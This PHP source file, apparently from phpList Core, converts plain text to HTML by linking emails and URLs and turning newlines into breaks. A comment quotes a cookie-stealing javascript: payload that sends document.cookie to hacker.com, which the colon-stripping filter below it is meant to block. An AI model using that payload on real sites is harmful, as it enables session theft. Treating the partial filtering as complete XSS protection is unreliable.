<?php

declare(strict_types=1);

namespace PhpList\Core\Domain\Common;

class TextParser
{
    public function __invoke(string $text): string
    {
        $text = ltrim($text);
        $text = preg_replace_callback(
            '/\b([a-z0-9](?:[a-z0-9._%+-]{0,62}[a-z0-9])?@' .
            '(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+' .
            '[a-z]{2,63})\b/i',
            static function (array $matches): string {
                $email = $matches[1];

                $emailEsc = htmlspecialchars($email, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

                $mailto = rawurlencode($email);

                return '<a href="mailto:' . $mailto . '" class="email">' . $emailEsc . '</a>';
            },
            $text
        );
        $linkPattern = '/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is';
        $link = [];
        $index = 0;
        while (preg_match($linkPattern, $text, $matches)) {
            $url = $matches[2];
            $rest = $matches[3];
            if (!preg_match('/^(http:)|(mailto:)|(ftp:)|(https:)/i', $url)) {
                // Removing all colons breaks legitimate URLs but avoids this 🤷
                //<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
                $url = preg_replace('/:/', '', $url);
            }
            $link[$index] = '<a href="' . $url . '" ' . $rest . '>' . $matches[4] . '</a>';
            $text = $matches[1] . '%%' . $index . '%%' . $matches[5];
            ++$index;
        }

        //make www. -> http://www.
        $text = preg_replace('/(www\.[a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i', 'http://\\1', $text);
        //take out duplicate schema
        $text = preg_replace('/(https?:\/\/)http?:\/\//i', '\\1', $text);
        $text = preg_replace('/(ftp:\/\/)http?:\/\//i', '\\1', $text);
        //eg-- http://kernel.org -> <a href"http://kernel.org" target="_blank">http://kernel.org</a>
        $text = preg_replace(
            '/(https?:\/\/)(?!www)([a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i',
            '<a href="\\1\\2" class="url" target="_blank">\\2</a>',
            $text
        );
        //eg -- http://www.google.com -> <a href"http://www.google.com" target="_blank">www.google.com</a>
        $text = preg_replace(
            '/(https?:\/\/)(www\.)([a-zA-Z0-9\.\/#~:?+=&%@!\\-_]+)/i',
            '<a href="\\1\\2\\3" class="url" target="_blank">\\2\\3</a>',
            $text
        );

        // take off a possible last full stop and move it outside
        $text = preg_replace(
            '/<a href=\"(.*?)\.\" class=\"url\" target=\"_blank\">(.*)\.<\/a>/i',
            '<a href="\\1" class="url" target="_blank">\\2</a>.',
            $text
        );

        for ($j = 0; $j < $index; ++$j) {
            $replacement = $link[$j];
            $text = preg_replace('/\%\%' . $j . '\%\%/', $replacement, $text);
        }

        // hmm, regular expression choke on some characters in the text
        // first replace all the brackets with placeholders.
        // we cannot use htmlspecialchars or addslashes, because some are needed

        $text = str_replace('\(', '<!--LB-->', $text);
        $text = str_replace('\)', '<!--RB-->', $text);
        $text = preg_replace('/\$/', '<!--DOLL-->', $text);

        // @@@ to be xhtml compabible we'd have to close the <p> as well
        // so for now, just make it two br/s, which will be done by replacing
        // \n with <br/>
        // $paragraph = '<p class="x">';
        $break = '<br />';
        $text = preg_replace("/\r/", '', $text);
        $text = preg_replace("/\n/", $break . "\n", $text);

        // reverse our previous placeholders
        $text = str_replace('<!--LB-->', '(', $text);
        $text = str_replace('<!--RB-->', ')', $text);

        return str_replace('<!--DOLL-->', '$', $text);
    }
}
